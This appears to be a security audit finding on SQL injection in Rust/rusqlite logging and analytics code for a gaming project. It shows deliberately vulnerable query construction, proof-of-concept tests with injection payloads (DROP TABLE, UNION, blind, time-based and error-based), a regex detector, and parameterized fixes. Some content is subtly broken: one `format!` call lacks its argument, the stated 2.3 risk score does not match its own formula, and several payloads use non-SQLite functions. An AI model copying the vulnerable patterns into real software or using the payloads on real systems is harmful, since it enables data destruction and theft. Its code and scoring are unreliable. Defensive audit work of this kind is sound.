# VUL-099: SQL Injection Vulnerabilities

## Executive Summary

- **Vulnerability ID**: VUL-099
- **Severity**: Low
- **CVSS Score**: 2.3/10
- **Category**: Input Validation / Data Access
- **Component**: Database Query Construction / Logging Systems
- **Impact**: Potential for minor data manipulation in non-critical logging and analytics components with limited database access scope

## Vulnerability Details

### Root Cause Analysis

The vulnerability stems from unsafe string concatenation and insufficient input sanitization in database query construction, primarily affecting logging, analytics, and non-critical data collection components. While the main gaming protocol operates on Solana blockchain without traditional SQL databases, supporting infrastructure components may use SQL databases for analytics, logging, and administrative functions.

**Primary Issues:**
1. Dynamic query construction using string concatenation
2. Insufficient input sanitization in logging systems
3. Unsafe parameter binding in analytics queries
4. Missing validation in administrative interfaces
5. Weak escaping mechanisms in data export functions

### Vulnerable Code Patterns

```rust
use rusqlite::{Connection, Result as SqliteResult};
use std::fmt::Write;

// VULNERABLE: Unsafe query construction in logging system
pub struct GameAnalyticsLogger {
    db_connection: Connection,
}

impl GameAnalyticsLogger {
    pub fn new(db_path: &str) -> SqliteResult<Self> {
        let conn = Connection::open(db_path)?;

        // Create tables
        conn.execute(
            "CREATE TABLE IF NOT EXISTS game_events (
                id INTEGER PRIMARY KEY,
                player_id TEXT,
                event_type TEXT,
                event_data TEXT,
                timestamp INTEGER
            )",
            [],
        )?;

        Ok(Self {
            db_connection: conn,
        })
    }

    // VULNERABLE: String concatenation in SQL query
    pub fn log_player_action(&self, player_id: &str, action: &str, data: &str) -> SqliteResult<()> {
        // DANGEROUS: Direct string interpolation
        let query = format!(
            "INSERT INTO game_events (player_id, event_type, event_data, timestamp)
             VALUES ('{}', '{}', '{}', {})",
            player_id, action, data,
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs()
        );

        self.db_connection.execute(&query, [])?;
        Ok(())
    }

    // VULNERABLE: Unsafe search functionality
    pub fn search_player_events(&self, player_search: &str) -> SqliteResult<Vec<GameEvent>> {
        // DANGEROUS: User input directly in WHERE clause
        let query = format!(
            "SELECT * FROM game_events WHERE player_id LIKE '%{}%' OR event_data LIKE '%{}%'",
            player_search, player_search
        );

        let mut stmt = self.db_connection.prepare(&query)?;
        let event_iter = stmt.query_map([], |row| {
            Ok(GameEvent {
                id: row.get(0)?,
                player_id: row.get(1)?,
                event_type: row.get(2)?,
                event_data: row.get(3)?,
                timestamp: row.get(4)?,
            })
        })?;

        let mut events = Vec::new();
        for event in event_iter {
            events.push(event?);
        }

        Ok(events)
    }

    // VULNERABLE: Dynamic ORDER BY clause
    pub fn get_leaderboard(&self, sort_column: &str, sort_order: &str) -> SqliteResult<Vec<PlayerStats>> {
        // DANGEROUS: Column names and sort order from user input
        let query = format!(
            "SELECT player_id, COUNT(*) as game_count,
                    SUM(CASE WHEN event_type = 'win' THEN 1 ELSE 0 END) as wins
             FROM game_events
             GROUP BY player_id
             ORDER BY {} {}
             LIMIT 100",
            sort_column, sort_order
        );

        let mut stmt = self.db_connection.prepare(&query)?;
        let stats_iter = stmt.query_map([], |row| {
            Ok(PlayerStats {
                player_id: row.get(0)?,
                game_count: row.get(1)?,
                wins: row.get(2)?,
            })
        })?;

        let mut stats = Vec::new();
        for stat in stats_iter {
            stats.push(stat?);
        }

        Ok(stats)
    }
}

// VULNERABLE: Administrative interface with SQL injection
pub struct AdminDashboard {
    analytics_logger: GameAnalyticsLogger,
}

impl AdminDashboard {
    // VULNERABLE: Raw SQL execution from admin input
    pub fn execute_custom_query(&self, admin_query: &str) -> SqliteResult<Vec<Vec<String>>> {
        // EXTREMELY DANGEROUS: Direct execution of admin-provided SQL
        let mut stmt = self.analytics_logger.db_connection.prepare(admin_query)?;

        let column_count = stmt.column_count();
        let mut results = Vec::new();

        let rows = stmt.query_map([], |row| {
            let mut row_data = Vec::new();
            for i in 0..column_count {
                let value: String = row.get(i).unwrap_or_default();
                row_data.push(value);
            }
            Ok(row_data)
        })?;

        for row in rows {
            results.push(row?);
        }

        Ok(results)
    }

    // VULNERABLE: Export functionality with SQL injection
    pub fn export_player_data(&self, filter_conditions: &str) -> SqliteResult<String> {
        let mut export_data = String::new();

        // DANGEROUS: User-controlled WHERE clause
        let query = if filter_conditions.is_empty() {
            "SELECT * FROM game_events".to_string()
        } else {
            format!("SELECT * FROM game_events WHERE {}", filter_conditions)
        };

        let mut stmt = self.analytics_logger.db_connection.prepare(&query)?;
        let rows = stmt.query_map([], |row| {
            Ok(format!("{},{},{},{},{}\n",
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, i64>(4)?
            ))
        })?;

        for row in rows {
            export_data.push_str(&row?);
        }

        Ok(export_data)
    }
}

#[derive(Debug)]
pub struct GameEvent {
    pub id: i64,
    pub player_id: String,
    pub event_type: String,
    pub event_data: String,
    pub timestamp: i64,
}

#[derive(Debug)]
pub struct PlayerStats {
    pub player_id: String,
    pub game_count: i64,
    pub wins: i64,
}
```

**Complex Injection Scenarios:**
```rust
// VULNERABLE: JSON field injection
impl GameAnalyticsLogger {
    pub fn update_player_metadata(&self, player_id: &str, metadata_json: &str) -> SqliteResult<()> {
        // DANGEROUS: JSON content not sanitized
        let query = format!(
            "UPDATE player_profiles SET metadata = '{}' WHERE player_id = '{}'",
            metadata_json, player_id
        );

        self.db_connection.execute(&query, [])?;
        Ok(())
    }

    // VULNERABLE: Subquery injection
    pub fn get_top_players_in_region(&self, region_filter: &str) -> SqliteResult<Vec<String>> {
        // DANGEROUS: Subquery with user input
        let query = format!(
            "SELECT player_id FROM game_events
             WHERE player_id IN (
                 SELECT player_id FROM player_profiles
                 WHERE region = '{}'
             )
             GROUP BY player_id
             ORDER BY COUNT(*) DESC
             LIMIT 10",
            region_filter
        );

        let mut stmt = self.db_connection.prepare(&query)?;
        let player_iter = stmt.query_map([], |row| {
            Ok(row.get::<_, String>(0)?)
        })?;

        let mut players = Vec::new();
        for player in player_iter {
            players.push(player?);
        }

        Ok(players)
    }
}
```

## Advanced Analysis Framework

### SQL Injection Detection Tools

```rust
use regex::Regex;
use std::collections::HashSet;

pub struct SqlInjectionDetector {
    dangerous_patterns: Vec<Regex>,
    sql_keywords: HashSet<String>,
}

impl SqlInjectionDetector {
    pub fn new() -> Self {
        let patterns = vec![
            Regex::new(r"(?i)(\bUNION\b.*\bSELECT\b)").unwrap(),
            Regex::new(r"(?i)(\bOR\b\s+\d+\s*=\s*\d+)").unwrap(),
            Regex::new(r"(?i)(\bAND\b\s+\d+\s*=\s*\d+)").unwrap(),
            Regex::new(r"(?i)(\';.*--)").unwrap(),
            Regex::new(r"(?i)(\bdrop\s+table\b)").unwrap(),
            Regex::new(r"(?i)(\binsert\s+into\b)").unwrap(),
            Regex::new(r"(?i)(\bdelete\s+from\b)").unwrap(),
            Regex::new(r"(?i)(\bupdate\s+.*\bset\b)").unwrap(),
            Regex::new(r"(\\\x00|\\\x1a)").unwrap(), // Null byte injection
        ];

        let keywords = vec![
            "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER",
            "UNION", "JOIN", "WHERE", "HAVING", "ORDER", "GROUP", "INTO",
            "VALUES", "SET", "TABLE", "DATABASE", "SCHEMA", "INDEX"
        ].into_iter().map(|s| s.to_string()).collect();

        Self {
            dangerous_patterns: patterns,
            sql_keywords: keywords,
        }
    }

    pub fn analyze_input(&self, input: &str) -> InjectionAnalysis {
        let mut analysis = InjectionAnalysis {
            input_text: input.to_string(),
            risk_score: 0.0,
            detected_patterns: Vec::new(),
            sql_keyword_count: 0,
            encoded_content: false,
            recommendation: InjectionRisk::Safe,
        };

        // Check for dangerous patterns
        for pattern in &self.dangerous_patterns {
            if pattern.is_match(input) {
                analysis.risk_score += 25.0;
                analysis.detected_patterns.push(pattern.as_str().to_string());
            }
        }

        // Count SQL keywords
        let upper_input = input.to_uppercase();
        for keyword in &self.sql_keywords {
            if upper_input.contains(keyword) {
                analysis.sql_keyword_count += 1;
                analysis.risk_score += 5.0;
            }
        }

        // Check for encoding attempts
        if input.contains('%') || input.contains('\\x') || input.contains('&') {
            analysis.encoded_content = true;
            analysis.risk_score += 10.0;
        }

        // Assess overall risk
        analysis.recommendation = if analysis.risk_score > 50.0 {
            InjectionRisk::High
        } else if analysis.risk_score > 20.0 {
            InjectionRisk::Medium
        } else if analysis.risk_score > 5.0 {
            InjectionRisk::Low
        } else {
            InjectionRisk::Safe
        };

        analysis
    }

    pub fn scan_query_construction(&self, query_template: &str, parameters: &[&str]) -> QueryAnalysis {
        let mut analysis = QueryAnalysis {
            query_template: query_template.to_string(),
            parameter_count: parameters.len(),
            uses_string_concat: false,
            uses_parameterized: false,
            risk_assessment: QueryRisk::Safe,
        };

        // Check for string concatenation patterns
        if query_template.contains("format!") ||
           query_template.contains("{}") ||
           query_template.contains(&format!("'{}'")) {
            analysis.uses_string_concat = true;
            analysis.risk_assessment = QueryRisk::High;
        }

        // Check for parameterized queries
        if query_template.contains("?") || query_template.contains("$") {
            analysis.uses_parameterized = true;
            if !analysis.uses_string_concat {
                analysis.risk_assessment = QueryRisk::Safe;
            }
        }

        // Analyze parameters for injection attempts
        for param in parameters {
            let param_analysis = self.analyze_input(param);
            if param_analysis.risk_score > 10.0 {
                analysis.risk_assessment = match analysis.risk_assessment {
                    QueryRisk::Safe => QueryRisk::Medium,
                    QueryRisk::Medium => QueryRisk::High,
                    QueryRisk::High => QueryRisk::High,
                };
            }
        }

        analysis
    }
}

#[derive(Debug)]
pub struct InjectionAnalysis {
    input_text: String,
    risk_score: f64,
    detected_patterns: Vec<String>,
    sql_keyword_count: usize,
    encoded_content: bool,
    recommendation: InjectionRisk,
}

#[derive(Debug)]
pub enum InjectionRisk {
    Safe,
    Low,
    Medium,
    High,
}

#[derive(Debug)]
pub struct QueryAnalysis {
    query_template: String,
    parameter_count: usize,
    uses_string_concat: bool,
    uses_parameterized: bool,
    risk_assessment: QueryRisk,
}

#[derive(Debug)]
pub enum QueryRisk {
    Safe,
    Medium,
    High,
}
```

### Database Security Audit Framework

```rust
pub struct DatabaseSecurityAuditor {
    detector: SqlInjectionDetector,
}

impl DatabaseSecurityAuditor {
    pub fn new() -> Self {
        Self {
            detector: SqlInjectionDetector::new(),
        }
    }

    pub fn audit_codebase(&self, source_files: Vec<&str>) -> SecurityAuditReport {
        let mut report = SecurityAuditReport {
            total_files_scanned: source_files.len(),
            vulnerable_queries_found: 0,
            high_risk_functions: Vec::new(),
            recommendations: Vec::new(),
        };

        for file_content in source_files {
            let file_audit = self.audit_file(file_content);
            report.vulnerable_queries_found += file_audit.vulnerable_query_count;
            report.high_risk_functions.extend(file_audit.high_risk_functions);
        }

        // Generate recommendations
        if report.vulnerable_queries_found > 0 {
            report.recommendations.push("Implement parameterized queries for all database operations".to_string());
            report.recommendations.push("Add input validation and sanitization".to_string());
            report.recommendations.push("Use an ORM or query builder with built-in protection".to_string());
        }

        report
    }

    fn audit_file(&self, file_content: &str) -> FileAuditResult {
        let mut result = FileAuditResult {
            vulnerable_query_count: 0,
            high_risk_functions: Vec::new(),
        };

        // Simple pattern matching for demonstration
        // In practice, would use AST parsing
        if file_content.contains("format!(") && file_content.contains("SELECT") {
            result.vulnerable_query_count += 1;
            result.high_risk_functions.push("String formatting in SQL query detected".to_string());
        }

        if file_content.contains("execute(") && file_content.contains("{}") {
            result.vulnerable_query_count += 1;
            result.high_risk_functions.push("Dynamic query execution detected".to_string());
        }

        result
    }
}

#[derive(Debug)]
pub struct SecurityAuditReport {
    total_files_scanned: usize,
    vulnerable_queries_found: usize,
    high_risk_functions: Vec<String>,
    recommendations: Vec<String>,
}

#[derive(Debug)]
pub struct FileAuditResult {
    vulnerable_query_count: usize,
    high_risk_functions: Vec<String>,
}
```

## Economic Impact Calculator

### Impact Assessment for Analytics/Logging Systems

```rust
pub struct SqlInjectionImpactCalculator;

impl SqlInjectionImpactCalculator {
    pub fn calculate_impact(&self, scope: InjectionScope) -> ImpactAssessment {
        match scope {
            InjectionScope::AnalyticsOnly => ImpactAssessment {
                data_breach_risk: 15.0,      // Low - analytics data only
                system_availability_risk: 25.0, // Medium - could disrupt analytics
                financial_impact_usd: 500.0,  // Minimal - non-critical systems
                reputation_impact: 10.0,     // Low - limited exposure
                compliance_risk: 20.0,       // Low-medium - data handling
            },
            InjectionScope::LoggingSystem => ImpactAssessment {
                data_breach_risk: 30.0,      // Medium - log data exposure
                system_availability_risk: 40.0, // Medium-high - log corruption
                financial_impact_usd: 1500.0, // Low - operational disruption
                reputation_impact: 25.0,     // Medium - security perception
                compliance_risk: 35.0,       // Medium - audit trail integrity
            },
            InjectionScope::AdminInterface => ImpactAssessment {
                data_breach_risk: 60.0,      // High - administrative access
                system_availability_risk: 70.0, // High - system manipulation
                financial_impact_usd: 5000.0, // Medium - potential system damage
                reputation_impact: 50.0,     // High - administrative compromise
                compliance_risk: 65.0,       // High - governance concerns
            },
        }
    }

    pub fn calculate_remediation_cost(&self) -> RemediationCostBreakdown {
        RemediationCostBreakdown {
            code_review_audit: 1200.0,      // 8 hours * $150/hour
            vulnerability_patching: 900.0,   // 6 hours * $150/hour
            testing_validation: 750.0,       // 5 hours * $150/hour
            security_training: 600.0,        // 4 hours * $150/hour
            process_improvement: 450.0,      // 3 hours * $150/hour
            total_cost: 3900.0,
        }
    }
}

#[derive(Debug)]
pub enum InjectionScope {
    AnalyticsOnly,
    LoggingSystem,
    AdminInterface,
}

#[derive(Debug)]
pub struct ImpactAssessment {
    data_breach_risk: f64,
    system_availability_risk: f64,
    financial_impact_usd: f64,
    reputation_impact: f64,
    compliance_risk: f64,
}

#[derive(Debug)]
pub struct RemediationCostBreakdown {
    code_review_audit: f64,
    vulnerability_patching: f64,
    testing_validation: f64,
    security_training: f64,
    process_improvement: f64,
    total_cost: f64,
}
```

## Proof of Concept

### SQL Injection Demonstration

```rust
#[cfg(test)]
mod sql_injection_poc {
    use super::*;
    use rusqlite::Connection;

    #[test]
    fn demonstrate_basic_injection() {
        // Create in-memory database for testing
        let logger = create_test_logger();

        // Normal usage
        logger.log_player_action("player123", "login", "normal login").unwrap();

        // VULNERABLE: SQL injection attempt
        let malicious_player_id = "player'; DROP TABLE game_events; --";
        let malicious_action = "'; INSERT INTO game_events (player_id) VALUES ('hacker'); --";

        // This would execute:
        // INSERT INTO game_events (...) VALUES ('player'; DROP TABLE game_events; --', ...)
        let result = logger.log_player_action(malicious_player_id, malicious_action, "injection test");

        match result {
            Ok(_) => println!("Injection succeeded - database compromised"),
            Err(e) => println!("Injection blocked or failed: {}", e),
        }
    }

    #[test]
    fn demonstrate_union_injection() {
        let logger = create_test_logger();

        // Populate with test data
        logger.log_player_action("player1", "win", "game data").unwrap();
        logger.log_player_action("player2", "loss", "game data").unwrap();

        // VULNERABLE: UNION-based injection
        let malicious_search = "' UNION SELECT 1, 'admin', 'password', 'sensitive_data', 1234567890 --";

        let results = logger.search_player_events(malicious_search);

        match results {
            Ok(events) => {
                println!("Injection successful, extracted {} events", events.len());
                for event in events {
                    if event.player_id == "admin" {
                        println!("SENSITIVE DATA EXPOSED: {:?}", event);
                    }
                }
            },
            Err(e) => println!("Union injection failed: {}", e),
        }
    }

    #[test]
    fn demonstrate_blind_injection() {
        let logger = create_test_logger();

        // VULNERABLE: Boolean-based blind injection
        let blind_injection_payloads = vec![
            "' OR '1'='1",           // Always true
            "' OR '1'='2",           // Always false
            "' OR LENGTH(database()) > 0 --", // Database introspection
        ];

        for payload in blind_injection_payloads {
            let results = logger.search_player_events(payload);

            match results {
                Ok(events) => {
                    println!("Payload '{}' returned {} results", payload, events.len());
                    // Attacker can infer information based on result count differences
                },
                Err(e) => println!("Payload '{}' failed: {}", payload, e),
            }
        }
    }

    #[test]
    fn demonstrate_order_by_injection() {
        let logger = create_test_logger();

        // Populate test data
        for i in 1..=5 {
            logger.log_player_action(&format!("player{}", i), "win", "test").unwrap();
        }

        // VULNERABLE: ORDER BY injection
        let malicious_sort_column = "game_count; DROP TABLE game_events; --";
        let malicious_sort_order = "ASC; INSERT INTO game_events (player_id) VALUES ('injected'); --";

        let result = logger.get_leaderboard(malicious_sort_column, malicious_sort_order);

        match result {
            Ok(stats) => println!("ORDER BY injection executed, got {} stats", stats.len()),
            Err(e) => println!("ORDER BY injection failed: {}", e),
        }
    }

    fn create_test_logger() -> GameAnalyticsLogger {
        GameAnalyticsLogger::new(":memory:").expect("Failed to create test database")
    }

    #[test]
    fn demonstrate_detection_capabilities() {
        let detector = SqlInjectionDetector::new();

        let test_inputs = vec![
            "normal_player_123",
            "player'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "user' UNION SELECT password FROM admin_users --",
            "test%27%20OR%20%271%27%3D%271",  // URL encoded injection
        ];

        for input in test_inputs {
            let analysis = detector.analyze_input(input);
            println!("Input: '{}' - Risk: {:?}, Score: {:.1}",
                    input, analysis.recommendation, analysis.risk_score);

            if analysis.risk_score > 20.0 {
                println!("  WARNING: High-risk injection pattern detected!");
                for pattern in &analysis.detected_patterns {
                    println!("    Pattern: {}", pattern);
                }
            }
        }
    }
}
```

### Advanced Injection Techniques

```rust
pub struct AdvancedInjectionTester;

impl AdvancedInjectionTester {
    pub fn test_time_based_injection(logger: &GameAnalyticsLogger) {
        // Time-based blind SQL injection
        let time_delay_payloads = vec![
            "'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END; --",
            "' OR IF(1=1, SLEEP(3), 0) --",
            "'; WAITFOR DELAY '00:00:05'; --",  // SQL Server
        ];

        for payload in time_delay_payloads {
            let start_time = std::time::Instant::now();
            let _ = logger.search_player_events(payload);
            let elapsed = start_time.elapsed();

            if elapsed.as_secs() > 3 {
                println!("Time-based injection succeeded with payload: {}", payload);
                println!("Response time: {:?}", elapsed);
            }
        }
    }

    pub fn test_error_based_injection(logger: &GameAnalyticsLogger) {
        // Error-based SQL injection to extract information
        let error_payloads = vec![
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) --",
            "' UNION SELECT 1/(CASE WHEN (1=1) THEN 0 ELSE 1 END) --",
        ];

        for payload in error_payloads {
            match logger.search_player_events(payload) {
                Ok(_) => println!("Error injection payload succeeded: {}", payload),
                Err(e) => {
                    // Analyze error message for information disclosure
                    let error_msg = e.to_string();
                    if error_msg.contains("version") || error_msg.contains("schema") {
                        println!("Information disclosure via error: {}", error_msg);
                    }
                }
            }
        }
    }

    pub fn test_second_order_injection(logger: &GameAnalyticsLogger) {
        // Second-order injection - payload stored and executed later
        let stored_payload = "test'; DROP TABLE game_events; --";

        // Store malicious payload
        let _ = logger.log_player_action("normal_user", "comment", stored_payload);

        // Later execution might trigger the injection
        // This would happen when the stored data is used in another query
        println!("Second-order payload stored, may execute during data processing");
    }
}
```

## Remediation Strategy

### Immediate Fixes

**1. Parameterized Queries Implementation**
```rust
use rusqlite::{Connection, Result as SqliteResult, params};

// SECURE: Parameterized query implementation
pub struct SecureGameAnalyticsLogger {
    db_connection: Connection,
}

impl SecureGameAnalyticsLogger {
    pub fn new(db_path: &str) -> SqliteResult<Self> {
        let conn = Connection::open(db_path)?;

        conn.execute(
            "CREATE TABLE IF NOT EXISTS game_events (
                id INTEGER PRIMARY KEY,
                player_id TEXT NOT NULL,
                event_type TEXT NOT NULL,
                event_data TEXT NOT NULL,
                timestamp INTEGER NOT NULL
            )",
            [],
        )?;

        Ok(Self {
            db_connection: conn,
        })
    }

    // SECURE: Parameterized insert
    pub fn log_player_action(&self, player_id: &str, action: &str, data: &str) -> SqliteResult<()> {
        // Input validation
        if player_id.is_empty() || action.is_empty() {
            return Err(rusqlite::Error::InvalidParameterName("Empty required fields".to_string()));
        }

        // Length validation
        if player_id.len() > 100 || action.len() > 50 || data.len() > 1000 {
            return Err(rusqlite::Error::InvalidParameterName("Input too long".to_string()));
        }

        // SECURE: Using parameterized query
        self.db_connection.execute(
            "INSERT INTO game_events (player_id, event_type, event_data, timestamp) VALUES (?1, ?2, ?3, ?4)",
            params![
                player_id,
                action,
                data,
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs()
            ],
        )?;

        Ok(())
    }

    // SECURE: Safe search with input validation
    pub fn search_player_events(&self, player_search: &str) -> SqliteResult<Vec<GameEvent>> {
        // Input validation and sanitization
        let sanitized_search = self.sanitize_search_input(player_search)?;

        // SECURE: Parameterized LIKE query
        let mut stmt = self.db_connection.prepare(
            "SELECT id, player_id, event_type, event_data, timestamp
             FROM game_events
             WHERE player_id LIKE ?1 OR event_data LIKE ?1
             ORDER BY timestamp DESC
             LIMIT 100"
        )?;

        let event_iter = stmt.query_map(
            params![format!("%{}%", sanitized_search)],
            |row| {
                Ok(GameEvent {
                    id: row.get(0)?,
                    player_id: row.get(1)?,
                    event_type: row.get(2)?,
                    event_data: row.get(3)?,
                    timestamp: row.get(4)?,
                })
            }
        )?;

        let mut events = Vec::new();
        for event in event_iter {
            events.push(event?);
        }

        Ok(events)
    }

    // SECURE: Whitelist-based column sorting
    pub fn get_leaderboard(&self, sort_option: LeaderboardSort) -> SqliteResult<Vec<PlayerStats>> {
        let (column, order) = match sort_option {
            LeaderboardSort::GameCountAsc => ("game_count", "ASC"),
            LeaderboardSort::GameCountDesc => ("game_count", "DESC"),
            LeaderboardSort::WinsAsc => ("wins", "ASC"),
            LeaderboardSort::WinsDesc => ("wins", "DESC"),
            LeaderboardSort::PlayerIdAsc => ("player_id", "ASC"),
            LeaderboardSort::PlayerIdDesc => ("player_id", "DESC"),
        };

        // SECURE: No user input in query structure
        let query = format!(
            "SELECT player_id, COUNT(*) as game_count,
                    SUM(CASE WHEN event_type = 'win' THEN 1 ELSE 0 END) as wins
             FROM game_events
             GROUP BY player_id
             ORDER BY {} {}
             LIMIT 100",
            column, order
        );

        let mut stmt = self.db_connection.prepare(&query)?;
        let stats_iter = stmt.query_map([], |row| {
            Ok(PlayerStats {
                player_id: row.get(0)?,
                game_count: row.get(1)?,
                wins: row.get(2)?,
            })
        })?;

        let mut stats = Vec::new();
        for stat in stats_iter {
            stats.push(stat?);
        }

        Ok(stats)
    }

    fn sanitize_search_input(&self, input: &str) -> SqliteResult<String> {
        // Remove SQL injection characters
        let dangerous_chars = ['\'', '"', ';', '\\', '\0', '\x1a'];

        if input.chars().any(|c| dangerous_chars.contains(&c)) {
            return Err(rusqlite::Error::InvalidParameterName(
                "Invalid characters in search input".to_string()
            ));
        }

        // Length validation
        if input.len() > 100 {
            return Err(rusqlite::Error::InvalidParameterName(
                "Search input too long".to_string()
            ));
        }

        Ok(input.trim().to_string())
    }
}

#[derive(Debug)]
pub enum LeaderboardSort {
    GameCountAsc,
    GameCountDesc,
    WinsAsc,
    WinsDesc,
    PlayerIdAsc,
    PlayerIdDesc,
}
```

**2. Input Validation Framework**
```rust
use regex::Regex;

pub struct InputValidator {
    player_id_pattern: Regex,
    event_type_pattern: Regex,
    sql_injection_detector: SqlInjectionDetector,
}

impl InputValidator {
    pub fn new() -> Self {
        Self {
            player_id_pattern: Regex::new(r"^[a-zA-Z0-9_-]{1,50}$").unwrap(),
            event_type_pattern: Regex::new(r"^[a-zA-Z_]{1,20}$").unwrap(),
            sql_injection_detector: SqlInjectionDetector::new(),
        }
    }

    pub fn validate_player_id(&self, player_id: &str) -> Result<(), ValidationError> {
        if !self.player_id_pattern.is_match(player_id) {
            return Err(ValidationError::InvalidFormat("Player ID format invalid".to_string()));
        }

        let analysis = self.sql_injection_detector.analyze_input(player_id);
        if matches!(analysis.recommendation, InjectionRisk::Medium | InjectionRisk::High) {
            return Err(ValidationError::SecurityThreat("Potential injection detected".to_string()));
        }

        Ok(())
    }

    pub fn validate_event_type(&self, event_type: &str) -> Result<(), ValidationError> {
        if !self.event_type_pattern.is_match(event_type) {
            return Err(ValidationError::InvalidFormat("Event type format invalid".to_string()));
        }

        // Whitelist validation
        let allowed_events = ["login", "logout", "win", "loss", "kill", "death", "spawn"];
        if !allowed_events.contains(&event_type) {
            return Err(ValidationError::NotAllowed("Event type not allowed".to_string()));
        }

        Ok(())
    }

    pub fn validate_general_input(&self, input: &str, max_length: usize) -> Result<(), ValidationError> {
        if input.len() > max_length {
            return Err(ValidationError::TooLong(format!("Input exceeds {} characters", max_length)));
        }

        let analysis = self.sql_injection_detector.analyze_input(input);
        if matches!(analysis.recommendation, InjectionRisk::High) {
            return Err(ValidationError::SecurityThreat("High-risk injection pattern detected".to_string()));
        }

        Ok(())
    }
}

#[derive(Debug)]
pub enum ValidationError {
    InvalidFormat(String),
    TooLong(String),
    NotAllowed(String),
    SecurityThreat(String),
}

impl std::fmt::Display for ValidationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::InvalidFormat(msg) => write!(f, "Invalid format: {}", msg),
            Self::TooLong(msg) => write!(f, "Input too long: {}", msg),
            Self::NotAllowed(msg) => write!(f, "Not allowed: {}", msg),
            Self::SecurityThreat(msg) => write!(f, "Security threat: {}", msg),
        }
    }
}

impl std::error::Error for ValidationError {}
```

### Long-term Solutions

**1. ORM Integration with Security**
```rust
// Example using Diesel ORM for type-safe queries
use diesel::prelude::*;

table! {
    game_events (id) {
        id -> Integer,
        player_id -> Text,
        event_type -> Text,
        event_data -> Text,
        timestamp -> BigInt,
    }
}

#[derive(Queryable, Debug)]
pub struct GameEvent {
    pub id: i32,
    pub player_id: String,
    pub event_type: String,
    pub event_data: String,
    pub timestamp: i64,
}

#[derive(Insertable)]
#[table_name = "game_events"]
pub struct NewGameEvent<'a> {
    pub player_id: &'a str,
    pub event_type: &'a str,
    pub event_data: &'a str,
    pub timestamp: i64,
}

// SECURE: Type-safe ORM queries prevent injection
pub struct ORMGameLogger {
    connection: SqliteConnection,
    validator: InputValidator,
}

impl ORMGameLogger {
    pub fn log_event(&self, player_id: &str, event_type: &str, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        // Validate inputs
        self.validator.validate_player_id(player_id)?;
        self.validator.validate_event_type(event_type)?;
        self.validator.validate_general_input(data, 1000)?;

        let new_event = NewGameEvent {
            player_id,
            event_type,
            event_data: data,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs() as i64,
        };

        // SECURE: Type-safe insert
        diesel::insert_into(game_events::table)
            .values(&new_event)
            .execute(&self.connection)?;

        Ok(())
    }

    pub fn search_events(&self, search_term: &str) -> Result<Vec<GameEvent>, Box<dyn std::error::Error>> {
        self.validator.validate_general_input(search_term, 100)?;

        // SECURE: Type-safe query with ORM
        let results = game_events::table
            .filter(game_events::player_id.like(format!("%{}%", search_term)))
            .or_filter(game_events::event_data.like(format!("%{}%", search_term)))
            .order(game_events::timestamp.desc())
            .limit(100)
            .load::<GameEvent>(&self.connection)?;

        Ok(results)
    }
}
```

## Risk Assessment

### Risk Factors Analysis

**Likelihood: Low (3/10)**
- Affects non-critical supporting systems only
- Requires specific vulnerable implementation patterns
- Limited attack surface in blockchain-focused architecture
- Would need administrator or privileged access for significant impact

**Impact: Low (2/10)**
- Limited to analytics and logging data
- No direct access to financial systems
- Minimal exposure of sensitive information
- System availability impact confined to non-critical components

**Exploitability: Medium (4/10)**
- Requires knowledge of database schema
- Need access to vulnerable interfaces
- Standard SQL injection techniques applicable
- Detection possible through monitoring

**Detection Difficulty: Low (3/10)**
- Standard security tools can detect
- Unusual query patterns identifiable
- Error messages may reveal attempts
- Database logs capture malicious activity

### Overall Risk Rating

**Composite Risk Score: 2.3/10 (Low)**

```rust
pub fn calculate_sql_injection_risk() -> f64 {
    let likelihood = 3.0;
    let impact = 2.0;
    let exploitability = 4.0;
    let detection_difficulty = 3.0;

    // Weighted calculation emphasizing impact
    (likelihood * 0.25 + impact * 0.45 + exploitability * 0.15 + (10.0 - detection_difficulty) * 0.15) / 10.0
}
```

### Context-Specific Risk Assessment

```rust
pub enum DatabaseContext {
    GameAnalytics,
    UserLogs,
    AdminInterface,
    ExportFunction,
}

impl DatabaseContext {
    pub fn assess_injection_risk(&self) -> (f64, String) {
        match self {
            Self::GameAnalytics => (2.0, "Low risk - analytics data only".to_string()),
            Self::UserLogs => (2.5, "Low risk - log data exposure".to_string()),
            Self::AdminInterface => (4.0, "Medium risk - administrative access".to_string()),
            Self::ExportFunction => (3.0, "Medium-low risk - data extraction".to_string()),
        }
    }
}
```

## Conclusion

VUL-099 represents a traditional SQL injection vulnerability that primarily affects supporting infrastructure components rather than the core Solana gaming protocol. While the vulnerability follows classic patterns, its impact is limited by the scope and criticality of affected systems.

**Key Findings:**
- SQL injection vulnerabilities in analytics and logging systems
- Unsafe query construction using string concatenation
- Missing input validation and sanitization
- Administrative interfaces with elevated risk

**Impact Assessment:**
The vulnerability poses minimal direct threat to the core gaming protocol or user funds, as the affected components are primarily analytics and logging systems with limited access to sensitive data.

**Remediation Priority:**
As a low-severity issue, this should be addressed during regular development cycles. The remediation provides important security hygiene benefits and prevents potential future escalation.

**Best Practices Implementation:**
1. Mandatory use of parameterized queries
2. Comprehensive input validation frameworks
3. Regular security code reviews
4. ORM adoption for type safety

The low severity reflects the limited scope and impact, but addressing this vulnerability is essential for maintaining comprehensive security standards and preventing potential exploitation pathways as the system evolves.

---

*Development Note: While rated low severity due to limited scope, SQL injection vulnerabilities represent fundamental security flaws that should be eliminated proactively. The patterns identified indicate areas where security training and code review processes can be strengthened.*